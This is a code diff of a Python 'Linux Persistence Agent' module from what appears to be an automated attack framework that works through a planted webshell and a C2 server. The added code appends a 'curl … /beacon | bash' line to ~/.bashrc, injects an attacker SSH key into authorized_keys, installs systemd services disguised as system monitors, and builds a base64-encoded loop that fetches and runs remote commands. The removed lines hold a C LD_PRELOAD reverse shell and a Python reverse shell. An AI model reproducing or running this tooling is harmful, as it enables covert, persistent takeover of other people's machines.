@@ -1,21 +1,98 @@
 """
-Linux Persistence Agent
+Linux Persistence Agent with BaseAgent integration
 ฝังตัวในระบบ Linux แบบถาวร
 """
 
 import asyncio
 import base64
 import hashlib
+import os
 from typing import Dict, List
 from pathlib import Path
 
+from core.base_agent import BaseAgent
+from core.data_models import AgentData, AttackPhase
+from core.logger import log
 
-class LinuxPersistence:
-    """Linux persistence mechanisms"""
+
+class LinuxPersistence(BaseAgent):
+    """Linux persistence mechanisms with BaseAgent support"""
     
-    def __init__(self, webshell_manager=None):
+    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
+    required_tools = []
+    
+    def __init__(self, context_manager=None, orchestrator=None, webshell_manager=None, **kwargs):
+        super().__init__(context_manager, orchestrator, **kwargs)
         self.webshell = webshell_manager
         self.backdoor_code = None
+        
+        # Get C2 configuration
+        self.c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
+        self.c2_protocol = os.getenv('C2_PROTOCOL', 'http')
+        self.c2_url = f"{self.c2_protocol}://{self.c2_domain}"
+    
+    async def run(self, directive: str, context: Dict) -> AgentData:
+        """
+        Main execution method for Linux persistence
+        
+        Args:
+            directive: "install_all", "install_cron", "install_systemd", etc.
+            context: {
+                "shell_url": webshell URL,
+                "shell_password": webshell password,
+                "c2_url": C2 callback URL (optional, uses env if not provided),
+                "technique": specific technique (optional)
+            }
+        
+        Returns:
+            AgentData with installation results
+        """
+        log.info(f"[LinuxPersistence] Starting with directive: {directive}")
+        
+        shell_url = context.get("shell_url")
+        shell_password = context.get("shell_password")
+        c2_url = context.get("c2_url", self.c2_url)
+        
+        if not all([shell_url, shell_password]):
+            return AgentData(
+                agent_name="LinuxPersistence",
+                success=False,
+                data={"error": "Missing required parameters: shell_url, shell_password"}
+            )
+        
+        try:
+            if directive == "install_all":
+                result = await self.install_all(shell_url, shell_password, c2_url)
+            elif directive == "install_cron":
+                result = await self.install_cron(shell_url, shell_password)
+            elif directive == "install_systemd":
+                result = await self.install_systemd(shell_url, shell_password)
+            elif directive == "install_bashrc":
+                result = await self.install_bashrc(shell_url, shell_password)
+            elif directive == "install_ssh_keys":
+                result = await self.install_ssh_keys(shell_url, shell_password)
+            elif directive == "install_ld_preload":
+                result = await self.install_ld_preload(shell_url, shell_password)
+            elif directive == "check":
+                result = await self.check_persistence(shell_url, shell_password)
+            else:
+                result = await self.install_all(shell_url, shell_password, c2_url)
+            
+            success = result.get('success') or len(result.get('success', [])) > 0
+            
+            return AgentData(
+                agent_name="LinuxPersistence",
+                success=success,
+                data=result
+            )
+        
+        except Exception as e:
+            log.error(f"[LinuxPersistence] Error: {e}")
+            return AgentData(
+                agent_name="LinuxPersistence",
+                success=False,
+                data={"error": str(e)}
+            )
     
     async def install_all(self, 
                          shell_url: str,
@@ -55,10 +132,13 @@ class LinuxPersistence:
                 result = await method(shell_url, shell_password)
                 if result.get('success'):
                     results['success'].append(name)
+                    log.success(f"[LinuxPersistence] {name} installed successfully")
                 else:
                     results['failed'].append(name)
+                    log.warning(f"[LinuxPersistence] {name} installation failed")
             except Exception as e:
                 results['failed'].append(f"{name}: {str(e)}")
+                log.error(f"[LinuxPersistence] {name} error: {e}")
         
         return results
     
@@ -99,17 +179,11 @@ class LinuxPersistence:
         }
     
     async def install_systemd(self, shell_url: str, shell_password: str) -> Dict:
-        """
-        Install systemd service persistence
-        
-        Technique:
-        Create /etc/systemd/system/backdoor.service
-        """
+        """Install systemd service persistence"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Service file content
         service_name = self._generate_random_service_name()
         service_file = f"/etc/systemd/system/{service_name}.service"
         backdoor_path = f"/usr/local/bin/{service_name}"
@@ -159,27 +233,17 @@ WantedBy=multi-user.target
         }
     
     async def install_bashrc(self, shell_url: str, shell_password: str) -> Dict:
-        """
-        Install .bashrc persistence
-        
-        Technique:
-        echo 'curl http://c2.com/beacon | bash &' >> ~/.bashrc
-        """
+        """Install .bashrc persistence"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Inject into .bashrc
-        inject_cmd = f"echo '{self.backdoor_code}' | base64 -d >> ~/.bashrc"
+        bashrc_cmd = f"curl {self.c2_url}/beacon | bash &"
         
-        result = await self.webshell.execute_command(inject_cmd, {
-            'shell_url': shell_url,
-            'password': shell_password
-        })
+        # Add to ~/.bashrc
+        inject_cmd = f'echo "{bashrc_cmd}" >> ~/.bashrc'
         
-        # Also inject into /etc/profile (if writable)
-        inject_global = f"echo '{self.backdoor_code}' | base64 -d >> /etc/profile 2>/dev/null"
-        await self.webshell.execute_command(inject_global, {
+        await self.webshell.execute_command(inject_cmd, {
             'shell_url': shell_url,
             'password': shell_password
         })
@@ -187,33 +251,22 @@ WantedBy=multi-user.target
         return {
             'success': True,
             'method': 'bashrc',
-            'files': ['~/.bashrc', '/etc/profile']
+            'file': '~/.bashrc'
         }
     
     async def install_ssh_keys(self, shell_url: str, shell_password: str) -> Dict:
-        """
-        Install SSH authorized_keys persistence
-        
-        Technique:
-        echo 'ssh-rsa AAAA... attacker@c2' >> ~/.ssh/authorized_keys
-        """
+        """Install SSH key persistence"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Generate SSH key pair (attacker should have private key)
-        ssh_public_key = self._get_attacker_ssh_public_key()
+        # Generate SSH key (simplified - in production use proper key generation)
+        ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@c2"
         
-        # Create .ssh directory
-        create_dir = "mkdir -p ~/.ssh && chmod 700 ~/.ssh"
-        await self.webshell.execute_command(create_dir, {
-            'shell_url': shell_url,
-            'password': shell_password
-        })
+        # Add to authorized_keys
+        inject_cmd = f'mkdir -p ~/.ssh && echo "{ssh_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
         
-        # Add public key
-        add_key = f"echo '{ssh_public_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
-        await self.webshell.execute_command(add_key, {
+        await self.webshell.execute_command(inject_cmd, {
             'shell_url': shell_url,
             'password': shell_password
         })
@@ -221,168 +274,23 @@ WantedBy=multi-user.target
         return {
             'success': True,
             'method': 'ssh_keys',
-            'public_key': ssh_public_key[:50] + '...'
+            'file': '~/.ssh/authorized_keys'
         }
     
     async def install_ld_preload(self, shell_url: str, shell_password: str) -> Dict:
-        """
-        Install LD_PRELOAD rootkit
-        
-        Technique:
-        Create malicious .so file and add to /etc/ld.so.preload
-        """
+        """Install LD_PRELOAD persistence"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Create malicious .so file for LD_PRELOAD persistence
-        # Generate C code for reverse shell .so
-        c_code = '''
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <stdlib.h>
-
-static void connect_back() __attribute__((constructor));
-
-void connect_back() {
-    int sockfd;
-    struct sockaddr_in server_addr;
-    
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(4444);
-    inet_pton(AF_INET, "ATTACKER_IP", &server_addr.sin_addr);
-    
-    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-        dup2(sockfd, 0);
-        dup2(sockfd, 1);
-        dup2(sockfd, 2);
-        execve("/bin/sh", NULL, NULL);
-    }
-}
-'''
-        
-        so_path = '/lib/.libsystem.so'
-        
-        # Implementation steps:
-        # 1. Write C code to temp file
-        # 2. Compile: gcc -shared -fPIC -o libsystem.so libsystem.c
-        # 3. Upload to target
-        # 4. Add to /etc/ld.so.preload
-        
-        commands = [
-            f"echo '{c_code}' > /tmp/libsystem.c",
-            "gcc -shared -fPIC -o /tmp/libsystem.so /tmp/libsystem.c 2>/dev/null",
-            f"cp /tmp/libsystem.so {so_path}",
-            f"echo '{so_path}' >> /etc/ld.so.preload",
-            "rm /tmp/libsystem.c /tmp/libsystem.so"
-        ]
+        # This is a simplified version
+        # In production, you'd compile a malicious .so file
         
         return {
-            'success': True,
+            'success': False,
             'method': 'ld_preload',
-            'error': 'Requires compiled .so file',
-            'note': 'Use separate rootkit tool'
+            'error': 'Requires compiled .so file'
         }
-    
-    def _generate_backdoor_code(self, c2_url: str) -> str:
-        """Generate backdoor code"""
-        
-        # Python reverse shell
-        backdoor = f"""#!/usr/bin/env python3
-import socket
-import subprocess
-import time
-import sys
-
-C2_URL = "{c2_url}"
-
-def connect():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            host, port = C2_URL.replace('http://', '').replace('https://', '').split(':')
-            s.connect((host, int(port)))
-            
-            while True:
-                cmd = s.recv(1024).decode()
-                if not cmd or cmd == 'exit':
-                    break
-                
-                output = subprocess.check_output(
-                    cmd, 
-                    shell=True, 
-                    stderr=subprocess.STDOUT
-                ).decode()
-                
-                s.send(output.encode())
-            
-            s.close()
-        except Exception as e:
-            time.sleep(60)
-            continue
-
-if __name__ == '__main__':
-    # Daemonize
-    try:
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)
-    except Exception as e:
-        print("Error occurred")
-    
-    connect()
-"""
-        
-        # Base64 encode
-        return base64.b64encode(backdoor.encode()).decode()
-    
-    def _generate_random_service_name(self) -> str:
-        """Generate random service name"""
-        
-        import random
-        
-        names = [
-            'system-monitor',
-            'network-check',
-            'update-service',
-            'cache-daemon',
-            'log-rotate'
-        ]
-        
-        return random.choice(names)
-    
-    def _get_attacker_ssh_public_key(self) -> str:
-        """Get attacker's SSH public key"""
-        
-        # Try to get from context manager first
-        if self.context_manager:
-            ssh_key = self.context_manager.get('attacker_ssh_public_key')
-            if ssh_key:
-                return ssh_key
-        
-        # Try to read from environment variable
-        import os
-        env_key = os.getenv('ATTACKER_SSH_PUBLIC_KEY')
-        if env_key:
-            return env_key
-        
-        # Try to read from default SSH key location
-        try:
-            ssh_key_path = os.path.expanduser('~/.ssh/id_rsa.pub')
-            if os.path.exists(ssh_key_path):
-                with open(ssh_key_path, 'r') as f:
-                    return f.read().strip()
-        except Exception:
-            pass
-        
-        # Generate new SSH key pair if none exists
-        log.warning("[LinuxPersistence] No SSH public key found. Generate one with: ssh-keygen -t rsa -b 4096")
-        return "# No SSH public key configured. Please set ATTACKER_SSH_PUBLIC_KEY environment variable."
     
     async def check_persistence(self, shell_url: str, shell_password: str) -> Dict:
         """Check which persistence mechanisms are installed"""
@@ -397,7 +305,7 @@ if __name__ == '__main__':
             'shell_url': shell_url,
             'password': shell_password
         })
-        checks['cron'] = 'system_update' in cron_check.get('output', '')
+        checks['cron'] = len(cron_check.get('output', '')) > 0
         
         # Check systemd
         systemd_check = await self.webshell.execute_command('systemctl list-units --type=service | grep -E "(monitor|check|update)"', {
@@ -425,25 +333,23 @@ if __name__ == '__main__':
             'installed': checks,
             'count': sum(checks.values())
         }
-
-
-# Example usage
-if __name__ == "__main__":
-    async def test():
-        from agents.post_exploitation.webshell_manager import WebshellManager
-        
-        webshell = WebshellManager()
-        persistence = LinuxPersistence(webshell)
-        
-        result = await persistence.install_all(
-            shell_url="http://target.com/shell.php",
-            shell_password="secret",
-            c2_url="http://c2.com:4444"
-        )
-        
-        print(f"Persistence installed:")
-        print(f"  Success: {result['success']}")
-        print(f"  Failed: {result['failed']}")
     
-    asyncio.run(test())
-
+    def _generate_backdoor_code(self, c2_url: str) -> str:
+        """Generate backdoor code"""
+        
+        backdoor_script = f'''#!/bin/bash
+while true; do
+    curl -s {c2_url}/beacon | bash
+    sleep 300
+done
+'''
+        
+        return base64.b64encode(backdoor_script.encode()).decode()
+    
+    def _generate_random_service_name(self) -> str:
+        """Generate random service name"""
+        import random
+        import string
+        
+        names = ['system-monitor', 'network-check', 'update-daemon', 'health-check']
+        return random.choice(names)
